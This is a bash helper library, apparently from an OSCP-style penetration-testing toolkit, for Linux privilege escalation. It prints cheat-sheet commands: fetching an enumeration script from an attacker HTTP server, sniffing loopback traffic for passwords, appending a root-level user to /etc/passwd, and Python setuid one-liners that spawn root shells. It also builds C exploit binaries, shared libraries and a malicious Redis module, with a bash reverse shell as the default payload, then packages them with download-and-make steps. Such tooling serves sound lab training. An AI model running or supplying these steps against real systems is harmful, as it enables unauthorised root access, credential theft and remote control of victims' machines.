#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
# shellcheck source=~/oscp/scripts/common/general.sh
source $SCRIPTDIR/general.sh
# shellcheck source=~/oscp/scripts/common/linux_cve.sh
source $SCRIPTDIR/linux_cve.sh

linux_esclation_strategy() {
    echo 'Linux Manual Enumeration'
    echo "wget http://$http_ip:$http_port/linux_auto.sh"
    echo 'Linux Automatic Enumeration'
    echo 'unix_privesc_check standard'
    echo 'linpeas.sh'
    echo 'Look at the processes ruunning'
    echo 'watch -n 1 "ps -aux | grep pass"'
    echo 'sudo tcpdump -i lo -A | grep "pass"'
    echo "Look at cron jobs"
    echo 'grep "CRON" /var/log/syslog'
    echo 'Adding password to /etc/passwd'
    echo 'openssl passwd w00t'
    echo 'echo "root2:$(openssl passwd w00t):0:0:root2:/root:/bin/bash" >> /etc/passwd'
    echo 'SUID'
    echo 'find / -perm -u=s -type f 2>/dev/null'
    echo 'Linux Capabilities'
    echo '/usr/sbin/getcap -r / 2>/dev/null'
    echo 'check GTFOBins for Linux'
    echo 'https://gtfobins.github.io/'
    echo 'check logs for unexpected blocks'
    echo 'cat /var/log/syslog | grep "[exploited process]"'
    echo 'Try other commands if they seem to be blocked'
    echo 'Search for kernel exploits'
    echo 'uname -r'
    echo 'arch'
    echo 'searchsploit linux kernel $(uname -r)'
}

#capabilities

get_python_setuid() {
    echo 'python'
    echo 'import os'
    echo 'os.setuid(0)'
    echo 'os.system("/bin/bash")'
}

create_passwd_user() {
    if [[ -z $username ]]; then
        username=attacker
        echo "username is not set, using default: $username"
    fi
    if [[ -z $password ]]; then
        password=password
        echo "password is not set, using default: $password"
    fi
    cmd="password_hash=\$(openssl passwd $password);"
    cmd+="echo \"\$password_hash\";"
    cmd+="echo \"$username:\$password_hash:0:0:root:/root:/bin/bash\" >> /etc/passwd"
    echo "$cmd"

}

create_linux_exploits_generic() {
    if [[ -z "$exploit_dir" ]]; then
        exploit_dir="exploit"
    fi
    if [[ -z $linux_c_file_name ]]; then
        echo "linux_c_file_name is not set"
        return 1
    fi
    if [[ -z $compile_command ]] && [[ ! -f "$exploit_dir/Makefile" ]]; then
        echo "compile_command is not set"
        return 1
    fi
    if [[ ! -d $exploit_dir ]]; then
        mkdir "$exploit_dir"
    fi
    pushd "$exploit_dir" || exit 1
    if [[ ! -z $exploit_output ]] && [[ -f $exploit_output ]]; then
        echo "Exploit output found, no need to recompile"
    else
        cp "$SCRIPTDIR/../c/$linux_c_file_name" .
        if [[ -z $cmd ]]; then
            cmd=$(get_bash_reverse_shell)
            echo "cmd is not set, using default: $cmd"
        fi
        local command=$(echo "$cmd" | sed 's/"/\\"/g')
        command=$(escape_sed "$command")
        sed -E -i 's/\{command\}/'"$command"'/g' $linux_c_file_name
        if [[ ! -f Makefile ]] || ! grep $exploit_output Makefile; then
            echo "Creating Makefile"
            echo "all:" > Makefile
            echo -e "\t$compile_command" >> Makefile
        fi
        if [[ ! -f make.sh ]]; then
            echo "Creating make.sh"
            #most production systems do not come with make
            echo "$compile_command" > make.sh
            chmod a+x make.sh  
        fi 
        if [[ ! -z $compile_exploit ]] && [[ $compile_exploit == "true" ]]; then
            compile_cpp
        fi
    fi

    popd || exit 1
    local exploit_filename=$(get_compression_filename "$exploit_dir")
    if [[ -f $exploit_filename ]]; then
        rm "$exploit_filename"
    fi
    compress_file "$exploit_filename" "$exploit_dir"
    generate_download_linux "$exploit_filename"
    get_uncompress_command "$exploit_filename"
    echo "cd $exploit_dir"
    echo "make"    
}

create_redis_module() {
    echo "Creating Redis module shared library..."
    exploit_dir="exploit_redis_module"
    if [[ ! -d $exploit_dir ]]; then
        mkdir "$exploit_dir"
    fi
    local redismodule_header_url="https://raw.githubusercontent.com/RedisLabsModules/RedisModulesSDK/refs/heads/master/"
    if [[ -z $redis_version ]]; then
        redismodule_header_url+="redismodule.h"
        redis_version="latest"
    else 
        redismodule_header_url+="$redis_version/redismodule.h"
    fi
    if [[ ! -f "$exploit_dir/redismodule.h" ]]; then
        wget "$redismodule_header_url" -O "$exploit_dir/redismodule.h"
    fi
    linux_c_file_name="redis_module.c"
    if [[ -z $exploit_output ]]; then
        exploit_output="redis_module.so"
    fi
    compile_command="gcc -o $exploit_output -shared -fPIC $linux_c_file_name"
    compile_exploit=true
    create_linux_exploits_generic

}
create_linux_executable() {
    echo "Creating Linux executable..."
    exploit_dir="exploit_executable"
    linux_c_file_name="run_linux.c"
    compile_command="gcc -o run_linux $linux_c_file_name"
    compile_exploit=true
    exploit_output="run_linux"
    create_linux_exploits_generic
}

create_linux_shared_library() {
    echo "Creating Linux shared library..."
    exploit_dir="exploit_shared"
    linux_c_file_name="run_linux_so.c"
    compile_command="gcc -shared -fPIC -o librun_linux.so $linux_c_file_name"
    compile_exploit=true
    exploit_output="librun_linux.so"
    create_linux_exploits_generic
}


compile_cpp() {
    if [[ -z "$target_os" ]]; then
        target_os="ubuntu:20.04"
        echo "target_os is not set, going to use the default $target_os"
    fi
    if [[ $target_os == "debian:9.0" ]]; then
        echo "# Main repositories
deb [trusted=yes] http://archive.debian.org/debian/ stretch main contrib non-free
# Security updates
deb [trusted=yes] http://archive.debian.org/debian-security/ stretch/updates main contrib non-free" > updates_sources.list
        preupdate_action="echo \"$(cat updates_sources.list)\" > /etc/apt/sources.list &&"
    fi
    if [[ $target_os == "debian:10.0" ]]; then
        echo "# Main repositories
deb [trusted=yes] http://archive.debian.org/debian/ buster main contrib non-free
# Security updates
deb [trusted=yes] http://archive.debian.org/debian-security/ buster/updates main contrib non-free" > updates_sources.list
        preupdate_action="echo \"$(cat updates_sources.list)\" > /etc/apt/sources.list &&"
    fi
    if [[ $target_os == "centos:7" ]] || [[ $target_os == "centos:8" ]]; then
        preupdate_action="sed -i 's/mirror\.centos\.org/vault.centos.org/g' /etc/yum.repos.d/CentOS-*.repo &&"
        preupdate_action+="sed -i 's/^#.*baseurl=http/baseurl=http/g' /etc/yum.repos.d/CentOS-*.repo &&"
        preupdate_action+="sed -i 's/^mirrorlist=http/#mirrorlist=http/g' /etc/yum.repos.d/CentOS-*.repo &&"
    fi
    if [[ $target_os == "ubuntu:12.04" ]]; then
        preupdate_action="sed -i 's/archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list &&"
        preupdate_action+="sed -i 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list &&"
        package_manager="apt-get"
    fi
    if [[ -z "$make_command" ]]; then
        make_command="make"
    fi
    if [[ ! -z "$extra_packages" ]]; then
        echo "Adding extra packages to the apt installation, $extra_packages"
    fi
    if [[ ! -z "$preupdate_action" ]]; then
        echo "Running preupdate_action: $preupdate_action"
    fi
    local install_command=""
    local update_command=""
    if [[ -z $package_manager ]]; then
        package_manager="apt"
        install_command="DEBIAN_FRONTEND=noninteractive $package_manager install -y"
        update_command="$package_manager update"
    elif [[ $package_manager == "apt-get" ]]; then
        install_command="DEBIAN_FRONTEND=noninteractive $package_manager install -y"
        update_command="$package_manager update"
    elif [[ $package_manager == "yum" ]]; then
        install_command="$package_manager -y install"
        update_command="echo not updating" #"$package_manager -y update"
    else
        echo "Unknown package manager: $package_manager"
        return 1
    fi
    docker run -v "$(pwd):/opt/exploit" -w "/opt/exploit" --rm "$target_os" /bin/bash -c "$preupdate_action $update_command && $install_command gcc binutils make $extra_packages && $make_command"

}

generate_exploit_download() {
    local cve_dir_lowercase=$(echo $cve_dir | sed 's/-/_/g' | tr '[:upper:]' '[:lower:]')
    local cve_filename=$(get_compression_filename $cve_dir_lowercase)
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    if [[ ! -z $exploit_executable ]]; then
        echo "./$exploit_executable"
    fi
}




get_compression_filename(){

    local cve_filename=""
    if [[ -z "$1" ]]; then
        echo "filename required"
        return 1
    else
        cve_filename="$1"
    fi
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi  
    if [[ $compression_type == "zip" ]]; then
        cve_filename="$cve_filename.zip"
    else
        cve_filename="$cve_filename.tar.gz"
    fi
    echo "$cve_filename"
}

compress_file() {
    local cve_filename="$1"
    local cve_dir="$2"
    if [[ -z $cve_filename ]]; then
        echo "cve_filename required"
        return 1
    fi
    if [[ -z "$cve_dir" ]]; then
        echo "cve_dir required"
        return 1
    fi
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi
    if [[ $compression_type == "zip" ]]; then
        zip -r "$cve_filename" "$cve_dir"
    else
        tar -czvf "$cve_filename" "$cve_dir"
    fi
}

get_uncompress_command() {
    if [[ -z "$1" ]]; then
        echo "cve_filename required"
        return 1
    fi
    local cve_filename="$1"
    if [[ -z $compression_type ]]; then
        compression_type="tar"
    fi    
    if [[ $compression_type == "zip" ]]; then
        echo "unzip $cve_filename"
    else
        echo "tar -xzvf $cve_filename"

    fi
}

get_python_euid0_to_root() {
    if [[ -z $python_version ]]; then
        python_version=3
    fi
    echo "python$python_version -c 'import os; import pty; os.setuid(0); os.setgid(0); pty.spawn(\"/bin/bash\")'"
}